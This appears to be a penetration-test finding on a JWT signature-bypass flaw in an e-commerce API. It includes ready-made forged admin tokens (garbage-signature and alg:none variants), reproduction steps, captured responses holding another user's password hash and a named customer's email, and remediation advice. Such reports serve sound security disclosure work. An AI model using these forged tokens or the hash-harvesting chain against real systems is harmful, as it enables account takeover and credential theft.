# JWT Signature Not Verified — Full Authentication Bypass and Admin Escalation on api.taintedport.com

**ID:** vuln-0005
**Severity:** CRITICAL
**Found:** 2026-07-20 11:46:35 UTC
**Target:** https://api.taintedport.com
**Endpoint:** /admin/orders
**Method:** GET
**CWE:** CWE-347
**CVSS:** 10.0 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H)

## Description

The API at `https://api.taintedport.com` (also reachable via `https://taintedport.com/api/*`) decodes and trusts the JSON Web Token (JWT) presented in the `Authorization: Bearer` header without cryptographically verifying its signature. An unauthenticated attacker can mint a JWT with an arbitrary `user_id` and `is_admin` value, sign it with random bytes (or drop the signature entirely by declaring `alg: none`), and have it accepted on every authenticated endpoint — including the entire `/admin/*` surface.

Concretely, independent testing confirmed that:

1. A forged HS256 token whose signature slot contains the literal string `BADSIG` (base64url-encoded `QkFEU0lH`) is accepted on `GET /admin/orders`, returning the complete admin order listing.
2. A token declaring `alg: none` with an empty signature is likewise accepted.
3. Requests without any `Authorization` header, and requests with obviously malformed tokens such as `xxx.xxx.xxx`, are correctly rejected with HTTP 401 — proving the endpoint IS gated on JWT presence; only the signature verification step is missing.

Chaining this with the deliberate over-exposure of `/orders/{id}` (which returns the owner's bcrypt `owner_password_hash` and `owner_totp_secret` to the claimed owner), an attacker walks the sequential integer order-ID space with a forged token per user_id and harvests every registered user's password hash and TOTP secret without ever presenting a valid credential.

## Attack Flow

```
┌──────────────────────────────────────────────────────────────────────────┐
│                JWT Signature Not Verified — Attack Flow                  │
└──────────────────────────────────────────────────────────────────────────┘

  ATTACKER (unauthenticated)                    api.taintedport.com
  ──────────────────────────                    ────────────────────

  ① Craft forged JWT
     header : {"alg":"HS256","typ":"JWT"}
     payload: {"user_id":1,"is_admin":true,
              "iat":1,"exp":9999999999}
     sig    : "BADSIG"  (any bytes)
                  │
                  │  GET /admin/orders
                  │  Authorization: Bearer <forged>
                  ▼
                                            ┌──────────────────────────┐
                                            │ JWT middleware:          │
                                            │  • base64-decode header  │
                                            │  • base64-decode payload │
                                            │  • check `exp`           │
                                            │  ✗ NO hash_hmac() call   │◄── ROOT CAUSE
                                            │  ✗ signature ignored     │
                                            └──────────────┬───────────┘
                                                           │ trusts is_admin=true
                                                           ▼
                                            ┌──────────────────────────┐
                                            │ Admin handler returns    │
                                            │ full order listing       │
                                            └──────────────┬───────────┘
  ② Receive 139 orders                                     │
     (every customer's data)  ◄───────────────────────────┘

  ③ Pick a victim: user_id=425, order_id=136

  ④ Re-forge token with user_id=425
                  │
                  │  GET /orders/136
                  │  Authorization: Bearer <forged user_id=425>
                  ▼
                                            ┌──────────────────────────┐
                                            │ Order handler:           │
                                            │  • trust `user_id` claim │
                                            │  • return order + owner  │
                                            │    password_hash + TOTP  │◄── AMPLIFIER
                                            └──────────────┬───────────┘
                                                           │
                                                           ▼
  ⑤ Receive bcrypt hash and TOTP secret
     for arbitrary victim account
     $2y$10$JoiU/0u23oVRmMtaEerD8.mP5sGbP9vDRqUVW9RyxAI8tPBt2LpDe
              │
              ▼
     Offline cracking / 2FA bypass / full account takeover

──────────────────────────────────────────────────────────────────────────
 ROOT CAUSE
   The JWT middleware decodes the payload and checks `exp` but never
   verifies the HMAC signature. `alg: none` with an empty signature and
   HS256 with an arbitrary signature are both accepted.

 PREREQUISITES
   • None. Unauthenticated network access to the API is sufficient.

 CONFIRMED CLAIMS FROM FORGED TOKEN
   • user_id  → arbitrary impersonation
   • is_admin → admin panel access
```

## Impact

A single unauthenticated HTTP request grants complete control of the application:

- **Authentication bypass.** Any user identity can be impersonated by setting the `user_id` claim in a self-signed token. `/auth/me` returns the target's profile, `/orders` returns the target's orders, `/cart` returns the target's cart, etc.
- **Privilege escalation to administrator.** Setting `is_admin: true` in the forged payload unlocks the entire `/admin/*` surface. During validation, `GET /admin/orders` returned 139 order records belonging to every customer of the store.
- **Bulk credential and 2FA-secret disclosure.** Combined with the sister information-disclosure issue on `/orders/{id}`, an attacker forges one token per user_id and harvests every user's bcrypt password hash and TOTP shared secret. Validation extracted `$2y$10$JoiU/0u23oVRmMtaEerD8.mP5sGbP9vDRqUVW9RyxAI8tPBt2LpDe` for a third-party account (`bfla-throw-29938@example.com`) without knowing their password.
- **Full data integrity impact.** Admin-only write endpoints (`PUT /admin/orders/{id}/status`, etc.) also honour the forged token, letting the attacker modify order state at will.
- **Persistence.** Because tokens do not include a per-user version counter, credential rotation by the victim does not evict the forged session; the attacker retains long-lived access until the JWT signing secret is rotated.

Business impact: full customer PII exposure, complete order/payment ledger disclosure, unrestricted admin actions, and enduring account takeover of every user in the database — all with zero prerequisites and zero user interaction.

## Technical Analysis

Legitimate tokens issued by `POST /auth/login` are HS256 with claims `{user_id, email, is_admin, iat, exp}`. Three tests demonstrate that no HMAC verification is performed at the middleware layer:

1. **Random signature accepted.** A freshly constructed header (`{"alg":"HS256","typ":"JWT"}`), an arbitrary payload (`{"user_id":1,"email":"attacker@example.com","is_admin":true,"iat":1,"exp":9999999999}`), and a signature segment containing the literal bytes `BADSIG` (base64url `QkFEU0lH`) are accepted by `GET /admin/orders` with HTTP 200 and the full order listing.
2. **`alg: none` accepted.** The same payload combined with a `{"alg":"none","typ":"JWT"}` header and an empty signature is accepted with HTTP 200 on the same endpoint.
3. **`exp` is still parsed.** A token with `exp: 100` is rejected as expired, proving the server does decode the payload — it simply omits the signature-verification step entirely.

Comparative controls:
- No `Authorization` header → HTTP 401 `Access denied. No token provided.`
- `Authorization: Bearer xxx.xxx.xxx` → HTTP 401 `Invalid or expired token.`
- Forged HS256 with garbage signature → HTTP 200 with admin data.

Root cause is a JWT verifier that base64-decodes header/payload and reads claims without ever calling an HMAC comparison, or a call to a library such as `firebase/php-jwt` with `['none']` (or `[$header->alg]`) in the algorithms allow-list — a well-known anti-pattern. Additional secondary weaknesses amplify the impact:

- The `is_admin` flag is trusted directly from the token rather than being re-derived server-side from the (theoretically verified) `user_id`.
- Order responses expose the resource owner's password hash and TOTP secret to whoever presents a token claiming that user_id, so a JWT forgery is equivalent to a credential dump.
- No token-versioning claim exists, so rotating the victim's password does not invalidate a forged token.

## Proof of Concept

Prerequisites: none — this is an unauthenticated attack.

Steps to reproduce:

1. Build a JWT header `{"alg":"HS256","typ":"JWT"}` and base64url-encode it (no padding) → `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`.
2. Build a payload `{"user_id":1,"email":"attacker@example.com","is_admin":true,"iat":1,"exp":9999999999}` and base64url-encode it.
3. Assemble the token `<header>.<payload>.QkFEU0lH` (the last segment can be any string; `QkFEU0lH` is just base64url of `BADSIG`).
4. Issue `GET https://api.taintedport.com/admin/orders` with the header `Authorization: Bearer <forged>`. The response is HTTP 200 with `{"success":true,"orders":[...]}` — the full admin listing.
5. To exfiltrate any user's bcrypt password hash, take a victim order_id and their user_id from the admin listing, re-forge the token with `user_id: <victim_uid>` (still HS256, still garbage signature), and request `GET /orders/<order_id>`. The `order.owner_password_hash` and `order.owner_totp_secret` fields are returned.

Alternative variant: use header `{"alg":"none","typ":"JWT"}` and an empty signature segment (`<header>.<payload>.`) — likewise accepted.

The included `poc/poc.py` runs the full chain end-to-end, printing the exfiltrated bcrypt hash on stdout. The `poc/verify.py` regression test exits 0 with `[VULNERABLE]` when the flaw is present.

```
Use poc_script_path.
```

## Evidence

### 1. Baseline — no token is correctly rejected

**Request:**
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com

```

**Response:**
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"success":false,"message":"Access denied. No token provided."}
```

> Endpoint is gated on the JWT — a missing Authorization header returns 401.

### 2. Baseline — obviously malformed token is rejected

**Request:**
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer xxx.xxx.xxx

```

**Response:**
```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json

{"success":false,"message":"Invalid or expired token."}
```

> Garbage that cannot even be base64-decoded as a JWT is rejected — proving the endpoint IS parsing the token.

### 3. Forged HS256 token with random signature — accepted (admin escalation)

**Request:**
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6ImF0dGFja2VyQGV4YW1wbGUuY29tIiwiaXNfYWRtaW4iOnRydWUsImlhdCI6MSwiZXhwIjo5OTk5OTk5OTk5fQ.QkFEU0lH

```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"orders":[{"id":139,"user_id":373,"user_name":"Luis Grangeia","user_email":"luis.grangeia@snyk.io","total":-9999000,"status":"pending",...},{"id":138,...}, ... 139 orders total ...]}
```

> Token payload declares user_id=1 / is_admin=true, signature is the literal string BADSIG (base64url QkFEU0lH). Server returns the full admin order listing — signature is not verified.

### 4. alg=none variant — likewise accepted

**Request:**
```http
GET /admin/orders HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyX2lkIjoxLCJlbWFpbCI6InB3bjJAeCIsImlzX2FkbWluIjp0cnVlLCJpYXQiOjEsImV4cCI6OTk5OTk5OTk5OX0.

```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"orders":[ ... same admin listing ... ]}
```

> A JWT declaring alg=none with an empty signature segment is accepted — the classic 'none' attack works too.

### 5. Impersonate victim user_id=425 and steal their password hash

**Request:**
```http
GET /orders/136 HTTP/1.1
Host: api.taintedport.com
Authorization: Bearer <forged HS256, user_id=425, is_admin=false, signature=QkFEU0lH>

```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: application/json

{"success":true,"order":{"id":136,"user_id":425,"total":1,"status":"shipped","owner_email":"bfla-throw-29938@example.com","owner_password_hash":"$2y$10$JoiU/0u23oVRmMtaEerD8.mP5sGbP9vDRqUVW9RyxAI8tPBt2LpDe","owner_totp_secret":null,"owner_is_admin":0,"items":[{"id":179,"wine_id":2,"wine_name":"Pêra-Manca Branco","price":1,"quantity":1}]}}
```

> Forging user_id=425 (a user we never authenticated as) is enough to read that user's order. The response embeds the victim's bcrypt password hash and TOTP seed — a full credential-and-2FA dump from a single unauthenticated request.


## Remediation

1. **Enforce signature verification.** Use a maintained JWT library with an explicit algorithm allow-list. In PHP with `firebase/php-jwt >= 6.x`:
   ```php
   $decoded = JWT::decode($token, new Key($secret, 'HS256'));
   ```
   Never pass `['none']` in the allow-list, and never trust the client-supplied `alg` header (`decode($token, $key, [$header->alg])` is a known anti-pattern).

2. **Reject `alg: none`, empty `alg`, and unknown algorithms** before touching the payload.

3. **Do not trust `is_admin` from the token.** After verifying the signature, look up the user row by `user_id` and derive `is_admin` server-side. Remove `is_admin` from the JWT entirely.

4. **Use a strong secret** (32+ random bytes) stored in a secrets manager, not in application source or unprotected `.env` files. Rotate immediately as part of this remediation because forged tokens with far-future `exp` are already in the wild.

5. **Add server-side revocation.** Include a `ver` claim tied to a per-user counter and increment it on password change, email change, or explicit logout so that token invalidation is possible without a full secret rotation.

6. **Add regression tests** that assert forged/tampered tokens are rejected: modified payload with kept signature, `alg=none` (all case variants and absent-alg), and wrong-key HMAC.

7. **Post-remediation, invalidate every currently-issued JWT** by rotating the signing secret. Any attacker who exercised this bug may hold long-lived tokens with `exp` set decades in the future.

8. **Stop leaking `owner_password_hash` and `owner_totp_secret`** from `/orders/{id}`. No client of an order endpoint should ever receive the owner's password hash or 2FA seed — this is the amplifier that turns the JWT bug into a full credential dump.

## Conditions for Severity Increase

Severity is already at the CVSS 3.1 ceiling for a network-reachable, single-request authentication bypass (Scope: Changed, C/I/A all High). No plausible external condition would raise it further.
